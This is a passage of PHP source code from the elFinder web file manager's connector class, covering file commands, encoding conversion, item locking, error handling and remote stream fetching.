        foreach ($targets as $target) {
            elFinder::checkAborted();
            if (($srcVolume = $this->volume($target)) == false) {
                $result['warning'] = array_merge($result['warning'], $this->error($error, '#' . $target, self::ERROR_FILE_NOT_FOUND));
                continue;
            }
            $rnres = array();
            if ($renames) {
                $file = $srcVolume->file($target);
                if (isset($renames[$file['name']])) {
                    $dir = $dstVolume->realpath($dst);
                    $dstName = $file['name'];
                    if ($srcVolume !== $dstVolume) {
                        $errors = array();
                        try {
                            $this->trigger('paste.copyfrom', array(&$dst, &$dstName, '', $this, $dstVolume), $errors);
                        } catch (elFinderTriggerException $e) {
                            $result['warning'] = array_merge($result['warning'], $errors);
                            continue;
                        }
                    }
                    if (isset($hashes[$file['name']])) {
                        $hash = $hashes[$file['name']];
                    } else {
                        $hash = $dstVolume->getHash($dir, $dstName);
                    }
                    $rnres = $this->rename(array('target' => $hash, 'name' => $dstVolume->uniqueName($dir, $dstName, $suffix, true, 0)));
                    if (!empty($rnres['error'])) {
                        $result['warning'] = array_merge($result['warning'], $rnres['error']);
                        continue;
                    }
                }
            }
            if ($cut && $this->itemLocked($target)) {
                $rm = $srcVolume->file($target);
                $result['warning'] = array_merge($result['warning'], $this->error(self::ERROR_LOCKED, $rm['name']));
                continue;
            }
            if (($file = $dstVolume->paste($srcVolume, $target, $dst, $cut, $hashes)) == false) {
                $result['warning'] = array_merge($result['warning'], $this->error($dstVolume->error()));
                continue;
            }
            if ($error = $dstVolume->error()) {
                $result['warning'] = array_merge($result['warning'], $this->error($error));
            }
            if ($rnres) {
                $result = array_merge_recursive($result, $rnres);
            }
        }
        if (count($result['warning']) < 1) {
            unset($result['warning']);
        } else {
            $result['sync'] = true;
        }
        return $result;
    }

    protected function get($args)
    {
        $target = $args['target'];
        $volume = $this->volume($target);
        $enc = false;
        if (!$volume || ($file = $volume->file($target)) == false) {
            return array('error' => $this->error(self::ERROR_OPEN, '#' . $target, self::ERROR_FILE_NOT_FOUND));
        }
        if ($volume->commandDisabled('get')) {
            return array('error' => $this->error(self::ERROR_OPEN, '#' . $target, self::ERROR_ACCESS_DENIED));
        }
        if (($content = $volume->getContents($target)) === false) {
            return array('error' => $this->error(self::ERROR_OPEN, $volume->path($target), $volume->error()));
        }
        $mime = isset($file['mime']) ? $file['mime'] : '';
        if ($mime && (strtolower(substr($mime, 0, 4)) === 'text' || in_array(strtolower($mime), self::$textMimes))) {
            $enc = '';
            if ($content !== '') {
                if (!$args['conv'] || $args['conv'] == '1') {
                    if (function_exists('mb_detect_encoding')) {
                        if ($enc = mb_detect_encoding($content, mb_detect_order(), true)) {
                            $encu = strtoupper($enc);
                            if ($encu === 'UTF-8' || $encu === 'ASCII') {
                                $enc = '';
                            }
                        } else {
                            $enc = 'unknown';
                        }
                    } else if (!preg_match('//u', $content)) {
                        $enc = 'unknown';
                    }
                    if ($enc === 'unknown') {
                        $enc = $volume->getOption('encoding');
                        if (!$enc || strtoupper($enc) === 'UTF-8') {
                            $enc = 'unknown';
                        }
                    }
                    if (!empty($this->listeners['get.detectencoding'])) {
                        foreach ($this->listeners['get.detectencoding'] as $handler) {
                            call_user_func_array($handler, array('get', &$enc, array_merge($args, array('content' => $content)), $this, $volume));
                        }
                    }
                    if ($enc && $enc !== 'unknown') {
                        $errlev = error_reporting();
                        error_reporting($errlev ^ E_NOTICE);
                        $utf8 = iconv($enc, 'UTF-8', $content);
                        if ($utf8 === false && function_exists('mb_convert_encoding')) {
                            error_reporting($errlev ^ E_WARNING);
                            $utf8 = mb_convert_encoding($content, 'UTF-8', $enc);
                            if (mb_convert_encoding($utf8, $enc, 'UTF-8') !== $content) {
                                $enc = 'unknown';
                            }
                        } else {
                            if ($utf8 === false || iconv('UTF-8', $enc, $utf8) !== $content) {
                                $enc = 'unknown';
                            }
                        }
                        error_reporting($errlev);
                        if ($enc !== 'unknown') {
                            $content = $utf8;
                        }
                    }
                    if ($enc) {
                        if ($args['conv'] == '1') {
                            $args['conv'] = '';
                            if ($enc === 'unknown') {
                                $content = false;
                            }
                        } else if ($enc === 'unknown') {
                            return array('doconv' => $enc);
                        }
                    }
                    if ($args['conv'] == '1') {
                        $args['conv'] = '';
                    }
                }
                if ($args['conv']) {
                    $enc = $args['conv'];
                    if (strtoupper($enc) !== 'UTF-8') {
                        $_content = $content;
                        $errlev = error_reporting();
                        $this->setToastErrorHandler(array('prefix' => 'Notice: '));
                        error_reporting($errlev | E_NOTICE | E_WARNING);
                        $content = iconv($enc, 'UTF-8//TRANSLIT', $content);
                        if ($content === false && function_exists('mb_convert_encoding')) {
                            $content = mb_convert_encoding($_content, 'UTF-8', $enc);
                        }
                        error_reporting($errlev);
                        $this->setToastErrorHandler(false);
                    } else {
                        $enc = '';
                    }
                }
            }
        } else {
            $content = 'data:' . ($mime ? $mime : 'application/octet-stream') . ';base64,' . base64_encode($content);
        }
        if ($enc !== false) {
            $json = false;
            if ($content !== false) {
                $json = json_encode($content);
            }
            if ($content === false || $json === false || strlen($json) < strlen($content)) {
                return array('doconv' => 'unknown');
            }
        }
        $res = array(
            'header' => array('Content-Type: application/json'),
            'content' => $content
        );
        if ($cacheHeaders = $volume->getOption('cacheHeaders')) {
            $res['header'] = array_merge($res['header'], $cacheHeaders);
        }
        if ($enc) {
            $res['encoding'] = $enc;
        }
        return $res;
    }

    protected function put($args)
    {
        $target = $args['target'];
        $encoding = isset($args['encoding']) ? $args['encoding'] : '';
        if (($volume = $this->volume($target)) == false
            || ($file = $volume->file($target)) == false) {
            return array('error' => $this->error(self::ERROR_SAVE, '#' . $target, self::ERROR_FILE_NOT_FOUND));
        }
        $this->itemLock($target);
        if ($encoding === 'scheme') {
            if (preg_match('~^https?://~i', $args['content'])) {
                $fp = $this->get_remote_contents($args['content'], 30, 5, 'Mozilla/5.0', $volume->tmpfile());
                if (!$fp) {
                    return array('error' => self::ERROR_SAVE, $args['content'], self::ERROR_FILE_NOT_FOUND);
                }
                $fmeta = stream_get_meta_data($fp);
                $mime = $this->detectMimeType($fmeta['uri']);
                if ($mime === 'unknown') {
                    $mime = 'application/octet-stream';
                }
                $mime = $volume->mimeTypeNormalize($mime, $file['name']);
                $args['content'] = 'data:' . $mime . ';base64,' . base64_encode(file_get_contents($fmeta['uri']));
            }
            $encoding = '';
            $args['content'] = "\0" . $args['content'];
        } else if ($encoding === 'hash') {
            $_hash = $args['content'];
            if ($_src = $this->getVolume($_hash)) {
                if ($_file = $_src->file($_hash)) {
                    if ($_data = $_src->getContents($_hash)) {
                        $args['content'] = 'data:' . $file['mime'] . ';base64,' . base64_encode($_data);
                    }
                }
            }
            $encoding = '';
            $args['content'] = "\0" . $args['content'];
        }
        if ($encoding) {
            $content = iconv('UTF-8', $encoding, $args['content']);
            if ($content === false && function_exists('mb_detect_encoding')) {
                $content = mb_convert_encoding($args['content'], $encoding, 'UTF-8');
            }
            if ($content !== false) {
                $args['content'] = $content;
            }
        }
        if (($file = $volume->putContents($target, $args['content'])) == false) {
            return array('error' => $this->error(self::ERROR_SAVE, $volume->path($target), $volume->error()));
        }
        return array('changed' => array($file));
    }

    protected function extract($args)
    {
        $target = $args['target'];
        $makedir = isset($args['makedir']) ? (bool)$args['makedir'] : null;
        if(strpos($target,'..') !== false){
            return array('error' => $this->error(self::ERROR_EXTRACT, '#' . $target, self::ERROR_FILE_NOT_FOUND));
        }
        if (($volume = $this->volume($target)) == false
            || ($file = $volume->file($target)) == false) {
            return array('error' => $this->error(self::ERROR_EXTRACT, '#' . $target, self::ERROR_FILE_NOT_FOUND));
        }
        $res = array();
        if ($file = $volume->extract($target, $makedir)) {
            $res['added'] = isset($file['read']) ? array($file) : $file;
            if ($err = $volume->error()) {
                $res['warning'] = $err;
            }
        } else {
            $res['error'] = $this->error(self::ERROR_EXTRACT, $volume->path($target), $volume->error());
        }
        return $res;
    }

    protected function archive($args)
    {
        $targets = isset($args['targets']) && is_array($args['targets']) ? $args['targets'] : array();
        $name = isset($args['name']) ? $args['name'] : '';
        if(strpos($name,'..') !== false){
            return $this->error('Invalid Request.', self::ERROR_TRGDIR_NOT_FOUND);
        }
        $targets = array_filter($targets, array($this, 'volume'));
        if (!$targets || ($volume = $this->volume($targets[0])) === false) {
            return $this->error(self::ERROR_ARCHIVE, self::ERROR_TRGDIR_NOT_FOUND);
        }
        foreach ($targets as $target) {
            $explodedStr = explode('l1_', $target);
            $targetFolderName = base64_decode($explodedStr[1]);
            if(strpos($targetFolderName,'..') !== false){
                return $this->error('Invalid Request.', self::ERROR_TRGDIR_NOT_FOUND);
            }
            $this->itemLock($target);
        }
        return ($file = $volume->archive($targets, $args['type'], $name))
            ? array('added' => array($file))
            : array('error' => $this->error(self::ERROR_ARCHIVE, $volume->error()));
    }

    protected function search($args)
    {
        $q = trim($args['q']);
        $mimes = !empty($args['mimes']) && is_array($args['mimes']) ? $args['mimes'] : array();
        $target = !empty($args['target']) ? $args['target'] : null;
        $type = !empty($args['type']) ? $args['type'] : null;
        $result = array();
        $errors = array();
        if ($target) {
            if ($volume = $this->volume($target)) {
                $result = $volume->search($q, $mimes, $target, $type);
                $errors = array_merge($errors, $volume->error());
            }
        } else {
            foreach ($this->volumes as $volume) {
                $result = array_merge($result, $volume->search($q, $mimes, null, $type));
                $errors = array_merge($errors, $volume->error());
            }
        }
        $result = array('files' => $result);
        if ($errors) {
            $result['warning'] = $errors;
        }
        return $result;
    }

    protected function info($args)
    {
        $files = array();
        $compare = null;
        if ($args['compare'] && count($args['targets']) === 1) {
            $compare = intval($args['compare']);
            $hash = $args['targets'][0];
            if ($volume = $this->volume($hash)) {
                $standby = (int)$volume->getOption('plStandby');
                $_compare = false;
                if (($syncCheckFunc = $volume->getOption('syncCheckFunc')) && is_callable($syncCheckFunc)) {
                    $_compare = call_user_func_array($syncCheckFunc, array($volume->realpath($hash), $standby, $compare, $volume, $this));
                }
                if ($_compare !== false) {
                    $compare = $_compare;
                } else {
                    $sleep = max(1, (int)$volume->getOption('tsPlSleep'));
                    $limit = max(1, $standby / $sleep) + 1;
                    do {
                        elFinder::extendTimeLimit(30 + $sleep);
                        $volume->clearstatcache();
                        if (($info = $volume->file($hash)) != false) {
                            if ($info['ts'] != $compare) {
                                $compare = $info['ts'];
                                break;
                            }
                        } else {
                            $compare = 0;
                            break;
                        }
                        if (--$limit) {
                            sleep($sleep);
                        }
                    } while ($limit);
                }
            }
        } else {
            foreach ($args['targets'] as $hash) {
                elFinder::checkAborted();
                if (($volume = $this->volume($hash)) != false
                    && ($info = $volume->file($hash)) != false) {
                    $info['path'] = $volume->path($hash);
                    $files[] = $info;
                }
            }
        }
        $result = array('files' => $files);
        if (!is_null($compare)) {
            $result['compare'] = strval($compare);
        }
        return $result;
    }

    protected function dim($args)
    {
        $res = array();
        $target = $args['target'];
        if (($volume = $this->volume($target)) != false) {
            if ($dim = $volume->dimensions($target, $args)) {
                if (is_array($dim) && isset($dim['dim'])) {
                    $res = $dim;
                } else {
                    $res = array('dim' => $dim);
                    if ($subImgLink = $volume->getSubstituteImgLink($target, explode('x', $dim))) {
                        $res['url'] = $subImgLink;
                    }
                }
            }
        }
        return $res;
    }

    protected function resize($args)
    {
        $target = $args['target'];
        $width = (int)$args['width'];
        $height = (int)$args['height'];
        $x = (int)$args['x'];
        $y = (int)$args['y'];
        $mode = $args['mode'];
        $bg = $args['bg'];
        $degree = (int)$args['degree'];
        $quality = (int)$args['quality'];
        if (($volume = $this->volume($target)) == false
            || ($file = $volume->file($target)) == false) {
            return array('error' => $this->error(self::ERROR_RESIZE, '#' . $target, self::ERROR_FILE_NOT_FOUND));
        }
        if ($mode !== 'rotate' && ($width < 1 || $height < 1)) {
            return array('error' => $this->error(self::ERROR_RESIZESIZE));
        }
        return ($file = $volume->resize($target, $width, $height, $x, $y, $mode, $bg, $degree, $quality))
            ? (!empty($file['losslessRotate']) ? $file : array('changed' => array($file)))
            : array('error' => $this->error(self::ERROR_RESIZE, $volume->path($target), $volume->error()));
    }

    protected function url($args)
    {
        $target = $args['target'];
        $options = isset($args['options']) ? $args['options'] : array();
        if (($volume = $this->volume($target)) != false) {
            if (!$volume->commandDisabled('url')) {
                $url = $volume->getContentUrl($target, $options);
                return $url ? array('url' => $url) : array();
            }
        }
        return array();
    }

    protected function callback($args)
    {
        $checkReg = '/[^a-zA-Z0-9;._-]/';
        $node = (isset($args['node']) && !preg_match($checkReg, $args['node'])) ? $args['node'] : '';
        $json = (isset($args['json']) && json_decode($args['json'])) ? $args['json'] : '{}';
        $bind = (isset($args['bind']) && !preg_match($checkReg, $args['bind'])) ? $args['bind'] : '';
        $done = (!empty($args['done']));
        while (ob_get_level()) {
            if (!ob_end_clean()) {
                break;
            }
        }
        if ($done || !$this->callbackWindowURL) {
            $script = '';
            if ($node) {
                if ($bind) {
                    $trigger = 'elf.trigger(\'' . $bind . '\', data);';
                    $triggerdone = 'elf.trigger(\'' . $bind . 'done\');';
                    $triggerfail = 'elf.trigger(\'' . $bind . 'fail\', data);';
                } else {
                    $trigger = $triggerdone = $triggerfail = '';
                }
                $origin = isset($_SERVER['HTTP_ORIGIN'])? str_replace('\'', '\\\'', $_SERVER['HTTP_ORIGIN']) : '*';
                $script .= '
var go = function() {
    var w = window.opener || window.parent || window,
        close = function(){
            window.open("about:blank","_self").close();
            return false;
        };
    try {
        var elf = w.document.getElementById(\'' . $node . '\').elfinder;
        if (elf) {
            var data = ' . $json . ';
            if (data.error) {
                ' . $triggerfail . '
                elf.error(data.error);
            } else {
                data.warning && elf.error(data.warning);
                data.removed && data.removed.length && elf.remove(data);
                data.added   && data.added.length   && elf.add(data);
                data.changed && data.changed.length && elf.change(data);
                ' . $trigger . '
                ' . $triggerdone . '
                data.sync && elf.sync();
            }
        }
    } catch(e) {
        w.postMessage && w.postMessage(JSON.stringify({bind:\'' . $bind . '\',data:' . $json . '}), \'' . $origin . '\');
    }
    close();
    setTimeout(function() {
        var msg = document.getElementById(\'msg\');
        msg.style.display = \'inline\';
        msg.onclick = close;
    }, 100);
};
';
            }
            $out = '<!DOCTYPE html><html lang="en"><head><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"><script>' . $script . '</script></head><body><h2 id="msg" style="display:none;"><a href="#">Please close this tab.</a></h2><script>go();</script></body></html>';
            header('Content-Type: text/html; charset=utf-8');
            header('Content-Length: ' . strlen($out));
            header('Cache-Control: private');
            header('Pragma: no-cache');
            echo $out;
        } else {
            $url = $this->callbackWindowURL;
            $url .= ((strpos($url, '?') === false) ? '?' : '&')
                . '&node=' . rawurlencode($node)
                . (($json !== '{}') ? ('&json=' . rawurlencode($json)) : '')
                . ($bind ? ('&bind=' . rawurlencode($bind)) : '')
                . '&done=1';
            header('Location: ' . $url);
        }
        throw new elFinderAbortException();
    }

    protected function toastErrorHandler($errno, $errstr, $errfile, $errline)
    {
        $proc = false;
        if (!(error_reporting() & $errno)) {
            return $proc;
        }
        $toast = array();
        $toast['mode'] = $this->toastParams['mode'];
        $toast['msg'] = $this->toastParams['prefix'] . $errstr;
        $this->toastMessages[] = $toast;
        return true;
    }

    public static function phpErrorHandler($errno, $errstr, $errfile, $errline)
    {
        static $base = null;
        $proc = false;
        if (is_null($base)) {
            $base = dirname(__FILE__) . DIRECTORY_SEPARATOR;
        }
        if (!(error_reporting() & $errno)) {
            return $proc;
        }
        if (strpos($errfile, $base) === 0) {
            $errfile = str_replace($base, '', $errfile);
        } else if ($pos = strrpos($errfile, '/vendor/')) {
            $errfile = substr($errfile, $pos + 1);
        } else {
            $errfile = basename($errfile);
        }
        switch ($errno) {
            case E_WARNING:
            case E_USER_WARNING:
                elFinder::$phpErrors[] = "WARNING: $errstr in $errfile line $errline.";
                $proc = true;
                break;
            case E_NOTICE:
            case E_USER_NOTICE:
                elFinder::$phpErrors[] = "NOTICE: $errstr in $errfile line $errline.";
                $proc = true;
                break;
            case E_RECOVERABLE_ERROR:
                elFinder::$phpErrors[] = "RECOVERABLE_ERROR: $errstr in $errfile line $errline.";
                $proc = true;
                break;
        }
        if (defined('E_STRICT') && $errno === @E_STRICT) {
            elFinder::$phpErrors[] = "STRICT: $errstr in $errfile line $errline.";
            $proc = true;
        }
        if (defined('E_DEPRECATED')) {
            switch ($errno) {
                case E_DEPRECATED:
                case E_USER_DEPRECATED:
                    elFinder::$phpErrors[] = "DEPRECATED: $errstr in $errfile line $errline.";
                    $proc = true;
                    break;
            }
        }
        return $proc;
    }

    protected function volume($hash)
    {
        foreach ($this->volumes as $id => $v) {
            if (strpos('' . $hash, $id) === 0) {
                return $this->volumes[$id];
            }
        }
        return false;
    }

    protected function toArray($data)
    {
        return isset($data['hash']) || !is_array($data) ? array($data) : $data;
    }

    protected function hashes($files)
    {
        $ret = array();
        foreach ($files as $file) {
            $ret[] = $file['hash'];
        }
        return $ret;
    }

    protected function filter($files)
    {
        $exists = array();
        foreach ($files as $i => $file) {
            if (isset($file['hash'])) {
                if (isset($exists[$file['hash']]) || !empty($file['hidden']) || !$this->default->mimeAccepted($file['mime'])) {
                    unset($files[$i]);
                }
                $exists[$file['hash']] = true;
            }
        }
        return array_values($files);
    }

    protected function utime()
    {
        $time = explode(" ", microtime());
        return (double)$time[1] + (double)$time[0];
    }

    protected function getNetVolumeUniqueId($netVolumes = null, $prefix = 'nm')
    {
        if (is_null($netVolumes)) {
            $netVolumes = $this->getNetVolumes();
        }
        $ids = array();
        foreach ($netVolumes as $vOps) {
            if (isset($vOps['id']) && strpos($vOps['id'], $prefix) === 0) {
                $ids[$vOps['id']] = true;
            }
        }
        if (!$ids) {
            $id = $prefix . '1';
        } else {
            $i = 0;
            while (isset($ids[$prefix . ++$i]) && $i < 10000) ;
            $id = $prefix . $i;
            if (isset($ids[$id])) {
                $id = false;
            }
        }
        return $id;
    }

    protected function itemLocked($hash)
    {
        if (!elFinder::$commonTempPath) {
            return false;
        }
        $lock = elFinder::$commonTempPath . DIRECTORY_SEPARATOR . self::filenameDecontaminate($hash) . '.lock';
        if (file_exists($lock)) {
            if (filemtime($lock) + $this->itemLockExpire < time()) {
                unlink($lock);
                return false;
            }
            return true;
        }
        return false;
    }

    protected function itemLock($hashes, $autoUnlock = true)
    {
        if (!elFinder::$commonTempPath) {
            return;
        }
        if (!is_array($hashes)) {
            $hashes = array($hashes);
        }
        foreach ($hashes as $hash) {
            $lock = elFinder::$commonTempPath . DIRECTORY_SEPARATOR . self::filenameDecontaminate($hash) . '.lock';
            if ($this->itemLocked($hash)) {
                $cnt = file_get_contents($lock) + 1;
            } else {
                $cnt = 1;
            }
            if (file_put_contents($lock, $cnt, LOCK_EX)) {
                if ($autoUnlock) {
                    $this->autoUnlocks[] = $hash;
                }
            }
        }
    }

    protected function itemUnlock($hash)
    {
        if (!$this->itemLocked($hash)) {
            return true;
        }
        $lock = elFinder::$commonTempPath . DIRECTORY_SEPARATOR . $hash . '.lock';
        $cnt = file_get_contents($lock);
        if (--$cnt < 1) {
            unlink($lock);
            return true;
        } else {
            file_put_contents($lock, $cnt, LOCK_EX);
            return false;
        }
    }

    public function itemAutoUnlock()
    {
        if ($this->autoUnlocks) {
            foreach ($this->autoUnlocks as $hash) {
                $this->itemUnlock($hash);
            }
            $this->autoUnlocks = array();
        }
    }

    protected function ensureDirsRecursively($volume, $target, $dirs, $path = '')
    {
        $res = array('stats' => array(), 'hashes' => array(), 'makes' => array(), 'error' => array());
        foreach ($dirs as $name => $sub) {
            $name = (string)$name;
            $dir = $newDir = null;
            if ((($parent = $volume->realpath($target)) && ($dir = $volume->dir($volume->getHash($parent, $name)))) || ($newDir = $volume->mkdir($target, $name))) {
                $_path = $path . '/' . $name;
                if ($newDir) {
                    $res['makes'][] = $newDir['hash'];
                    $dir = $newDir;
                }
                $res['stats'][] = $dir;
                $res['hashes'][$_path] = $dir['hash'];
                if (count($sub)) {
                    $res = array_merge_recursive($res, $this->ensureDirsRecursively($volume, $dir['hash'], $sub, $_path));
                }
            } else {
                $res['error'][] = $name;
            }
        }
        return $res;
    }

    public function setToastErrorHandler($opts)
    {
        $this->toastParams = $this->toastParamsDefault;
        if (!$opts) {
            restore_error_handler();
        } else {
            $this->toastParams = array_merge($this->toastParams, $opts);
            set_error_handler(array($this, 'toastErrorHandler'));
        }
    }

    public function utf8Encode($str)
    {
        static $mbencode = null;
        $str = (string) $str;
        if (@iconv('utf-8', 'utf-8//IGNORE', $str) === $str) {
            return $str;
        }
        if ($this->utf8Encoder) {
            return $this->utf8Encoder($str);
        }
        if ($mbencode === null) {
            $mbencode = function_exists('mb_convert_encoding') && function_exists('mb_detect_encoding');
        }
        if ($mbencode) {
            if ($enc = mb_detect_encoding($str, mb_detect_order(), true)) {
                $_str = mb_convert_encoding($str, 'UTF-8', $enc);
                if (@iconv('utf-8', 'utf-8//IGNORE', $_str) === $_str) {
                    return $_str;
                }
            }
        }
        return utf8_encode($str);
    }

    public static function getApiFullVersion()
    {
        return (string)self::$ApiVersion . '.' . (string)self::$ApiRevision;
    }

    public static function getCommonTempPath()
    {
        return self::$commonTempPath;
    }

    public static function isAnimationGif($path)
    {
        list(, , $type) = getimagesize($path);
        switch ($type) {
            case IMAGETYPE_GIF:
                break;
            default:
                return false;
        }
        $imgcnt = 0;
        $fp = fopen($path, 'rb');
        fread($fp, 4);
        $c = fread($fp, 1);
        if (ord($c) != 0x39) {
            return false;
        }
        while (!feof($fp)) {
            do {
                $c = fread($fp, 1);
            } while (ord($c) != 0x21 && !feof($fp));
            if (feof($fp)) {
                break;
            }
            $c2 = fread($fp, 2);
            if (bin2hex($c2) == "f904") {
                $imgcnt++;
                if ($imgcnt === 2) {
                    break;
                }
            }
            if (feof($fp)) {
                break;
            }
        }
        if ($imgcnt > 1) {
            return true;
        } else {
            return false;
        }
    }

    public static function isAnimationPng($path)
    {
        list(, , $type) = getimagesize($path);
        switch ($type) {
            case IMAGETYPE_PNG:
                break;
            default:
                return false;
        }
        $fp = fopen($path, 'rb');
        $img_bytes = fread($fp, 1024);
        fclose($fp);
        if ($img_bytes) {
            if (strpos(substr($img_bytes, 0, strpos($img_bytes, 'IDAT')), 'acTL') !== false) {
                return true;
            }
        }
        return false;
    }

    public static function isSeekableStream($resource)
    {
        $metadata = stream_get_meta_data($resource);
        return $metadata['seekable'];
    }

    public static function rewind($resource)
    {
        self::isSeekableStream($resource) && rewind($resource);
    }

    public static function isSeekableUrl($resource)
    {
        $id = (int)$resource;
        if (isset(elFinder::$seekableUrlFps[$id])) {
            return elFinder::$seekableUrlFps[$id];
        }
        return null;
    }

    public static function sessionDataEncode($var)
    {
        if (self::$base64encodeSessionData) {
            $var = base64_encode(serialize($var));
        }
        return $var;
    }

    public static function sessionDataDecode(&$var, $checkIs = null)
    {
        if (self::$base64encodeSessionData) {
            $data = unserialize(base64_decode($var));
        } else {
            $data = $var;
        }
        $chk = true;
        if ($checkIs) {
            switch ($checkIs) {
                case 'array': $chk = is_array($data); break;
                case 'string': $chk = is_string($data); break;
                case 'object': $chk = is_object($data); break;
                case 'int': $chk = is_int($data); break;
            }
        }
        if (!$chk) {
            unset($var);
            return false;
        }
        return $data;
    }

    public static function sessionWrite()
    {
        if (session_id()) {
            session_write_close();
        }
    }

    public static function getStaticVar($key)
    {
        return isset(elFinder::$$key) ? elFinder::$$key : null;
    }

    public static function extendTimeLimit($time = null)
    {
        static $defLimit = null;
        if (!self::aborted()) {
            if (is_null($defLimit)) {
                $defLimit = ini_get('max_execution_time');
            }
            if ($defLimit != 0) {
                $time = is_null($time) ? $defLimit : max($defLimit, $time);
                set_time_limit($time);
            }
        } else {
            throw new elFinderAbortException();
        }
    }

    public static function checkAborted()
    {
        elFinder::extendTimeLimit();
    }

    public static function getIniBytes($iniName = '', $val = '')
    {
        if ($iniName !== '') {
            $val = ini_get($iniName);
            if ($val === false) {
                return 0;
            }
        }
        $val = trim($val, "bB \t\n\r\0\x0B");
        $last = strtolower($val[strlen($val) - 1]);
        $val = sprintf('%u', $val);
        switch ($last) {
            case 'y':
            case 'z':
            case 'e':
            case 'p':
            case 't':
            case 'g':
            case 'm':
            case 'k':
                $val = elFinder::xKilobyte($val);
        }
        return $val;
    }

    public static function xKilobyte($val)
    {
        if (strpos((string)$val * 1024, 'E') !== false) {
            if (strpos((string)$val * 1.024, 'E') === false) {
                $val *= 1.024;
            }
            $val .= '000';
        } else {
            $val *= 1024;
        }
        return $val;
    }

    public static function getConnectorUrl()
    {
        if (defined('ELFINDER_CONNECTOR_URL')) {
            return ELFINDER_CONNECTOR_URL;
        }
        $https = (!empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off');
        $url = ($https ? 'https://' : 'http://')
            . $_SERVER['SERVER_NAME']
            . ((empty($_SERVER['SERVER_PORT']) || (!$https && $_SERVER['SERVER_PORT'] == 80) || ($https && $_SERVER['SERVER_PORT'] == 443)) ? '' : (':' . $_SERVER['SERVER_PORT']))
            . $_SERVER['REQUEST_URI'];
        list($url) = explode('?', $url);
        return $url;
    }

    public static function getStreamByUrl($data, $redirectLimit = 5)
    {
        if (isset($data['target'])) {
            $data = array(
                'cnt' => 0,
                'url' => $data['target'],
                'headers' => isset($data['headers']) ? $data['headers'] : array(),
                'postData' => isset($data['postData']) ? $data['postData'] : array(),
                'cookies' => array(),
            );
        }
        if ($data['cnt'] > $redirectLimit) {
            return false;
        }
        $dlurl = $data['url'];
        $data['url'] = '';
        $headers = $data['headers'];
        if ($dlurl) {
            $url = parse_url($dlurl);
            $ports = array('http' => '80', 'https' => '443', 'ftp' => '21');
            $url['scheme'] = strtolower($url['scheme']);
            if (!isset($url['port']) && isset($ports[$url['scheme']])) {
                $url['port'] = $ports[$url['scheme']];
            }
            if (!isset($url['port'])) {
                return false;
            }
            $cookies = array();
            if ($data['cookies']) {
                foreach ($data['cookies'] as $d => $c) {
                    if (strpos($url['host'], $d) !== false) {
                        $cookies[] = $c;
                    }
                }
            }
            $transport = ($url['scheme'] === 'https') ? 'ssl' : 'tcp';
            $query = isset($url['query']) ? '?' . $url['query'] : '';
            if (!($stream = stream_socket_client($transport . '://' . $url['host'] . ':' . $url['port']))) {
                return false;
            }
            $body = '';
            if (!empty($data['postData'])) {
                $method = 'POST';
                if (is_array($data['postData'])) {
                    $body = http_build_query($data['postData']);
                } else {
                    $body = $data['postData'];
                }
            } else {
                $method = 'GET';
            }
            $sends = array();
            $sends[] = "$method {$url['path']}{$query} HTTP/1.1";
            $sends[] = "Host: {$url['host']}";
            foreach ($headers as $header) {
                $sends[] = trim($header, "\r\n");
            }
            $sends[] = 'Connection: Close';
            if ($cookies) {
                $sends[] = 'Cookie: ' . implode('; ', $cookies);
            }
            if ($method === 'POST') {
                $sends[] = 'Content-Type: application/x-www-form-urlencoded';
                $sends[] = 'Content-Length: ' . strlen($body);
            }
            $sends[] = "\r\n" . $body;
            stream_set_timeout($stream, 300);
            fputs($stream, join("\r\n", $sends) . "\r\n");
            while (($res = trim(fgets($stream))) !== '') {
                if (preg_match('/^Location: (.+)$/i', $res, $m)) {
                    $data['url'] = $m[1];
                }
                if (strpos($res, 'Set-Cookie:') === 0) {
                    $domain = $url['host'];
                    if (preg_match('/^Set-Cookie:(.+)(?:domain=\s*([^ ;]+))?/i', $res, $c1)) {
                        if (!empty($c1[2])) {
                            $domain = trim($c1[2]);
                        }
                        if (preg_match('/([^ ]+=[^;]+)/', $c1[1], $c2)) {
                            $data['cookies'][$domain] = $c2[1];
                        }
                    }
                }
                if (preg_match('/^(Accept-Ranges|Content-Range): bytes/i', $res)) {
                    elFinder::$seekableUrlFps[(int)$stream] = true;
                }
            }
            if ($data['url']) {
                ++$data['cnt'];
                fclose($stream);
                return self::getStreamByUrl($data, $redirectLimit);
            }
            return $stream;
        }
        return false;
    }

    public function getFetchCookieFile()
    {
        $file = '';
        if ($tmpDir = $this->getTempDir()) {
            $file = $tmpDir . '/.elFinderAnonymousCookie';
        }
        return $file;
    }

    public static function curlExec($curl, $options = array(), $headers = array(), $postData = array())
    {
        $followLocation = (!ini_get('safe_mode') && !ini_get('open_basedir'));
        if ($followLocation) {
            curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
        }
        if ($options) {
            curl_setopt_array($curl, $options);
        }
        if ($headers) {
            curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
        }
        $result = curl_exec($curl);
        if (!$followLocation && $redirect = curl_getinfo($curl, CURLINFO_REDIRECT_URL)) {
            if ($stream = self::getStreamByUrl(array('target' => $redirect, 'headers' => $headers, 'postData' => $postData))) {
                $result = stream_get_contents($stream);
            }
        }
        if ($result === false) {
            if (curl_errno($curl)) {
                throw new \Exception('curl_exec() failed: ' . curl_error($curl));
            } else {
                throw new \Exception('curl_exec(): empty response');
            }
        }
        curl_close($curl);
        return $result;
    }

    public static function aborted()
    {
        if ($file = self::$abortCheckFile) {
            (version_compare(PHP_VERSION, '5.3.0') >= 0) ? clearstatcache(true, $file) : clearstatcache();
            if (!is_file($file)) {
                list($ptn) = explode('elfreq', $file);
                self::GlobGC($ptn . 'elfreq*', 43200);
                return true;
            }
        }
        return false;
    }

    public static function splitFileExtention($name)
    {
        if (preg_match('/^(.+?)?\.((?:tar\.(?:gz|bz|bz2|z|lzo))|cpio\.gz|ps\.gz|xcf\.(?:gz|bz2)|[a-z0-9]{1,10})$/i', $name, $m)) {
            return array((string)$m[1], $m[2]);
        } else {
            return array($name, '');
        }
    }

    public static function getMemorySizeByImageInfo($imgInfo)
    {
        $width = $imgInfo[0];
        $height = $imgInfo[1];
        $bits = isset($imgInfo['bits']) ? $imgInfo['bits'] : 24;
        $channels = isset($imgInfo['channels']) ? $imgInfo['channels'] : 3;
